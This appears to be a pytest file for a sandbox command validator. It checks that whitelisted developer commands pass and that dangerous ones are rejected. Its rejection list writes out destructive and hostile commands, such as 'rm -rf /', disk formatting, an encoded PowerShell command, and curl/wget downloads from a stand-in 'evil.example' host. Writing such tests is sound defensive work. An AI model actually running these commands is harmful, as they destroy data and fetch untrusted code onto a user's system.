from __future__ import annotations

import pytest

from app.core.exceptions import SemanticError
from app.sandbox.commands import run_command, validate_command


@pytest.mark.parametrize(
    "command",
    ["git status --short", "python -m pytest -q", "pnpm test", "ruff check .", "npx tsc --noEmit"],
)
def test_validate_allows_whitelisted(command: str) -> None:
    argv = validate_command(command)
    assert argv[0].lower() in {"git", "python", "pnpm", "ruff", "npx"}


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -fr .",
        "curl http://evil.example/x.sh",
        "wget http://evil.example/x.sh",
        "ssh root@host",
        "powershell -enc ZQBjAGgAbwA=",
        "cmd /c del *.*",
        "mkfs.ext4 /dev/sda1",
        "shutdown /s",
    ],
)
def test_validate_rejects_dangerous(command: str) -> None:
    with pytest.raises(SemanticError):
        validate_command(command)


def test_validate_rejects_unlisted_binary() -> None:
    with pytest.raises(SemanticError):
        validate_command("bash -c whoami")
    with pytest.raises(SemanticError):
        validate_command("")


async def test_run_command_success_and_output(tmp_path) -> None:
    result = await run_command(tmp_path, 'python -c "print(1+1)"')
    assert result.ok
    assert "2" in result.stdout


async def test_run_command_nonzero_exit(tmp_path) -> None:
    result = await run_command(tmp_path, 'python -c "import sys;sys.exit(3)"')
    assert result.returncode == 3
    assert not result.ok


async def test_run_command_times_out(tmp_path) -> None:
    result = await run_command(
        tmp_path, 'python -c "import time;time.sleep(5)"', timeout=1
    )
    assert result.returncode == -1
    assert "超时" in result.stderr
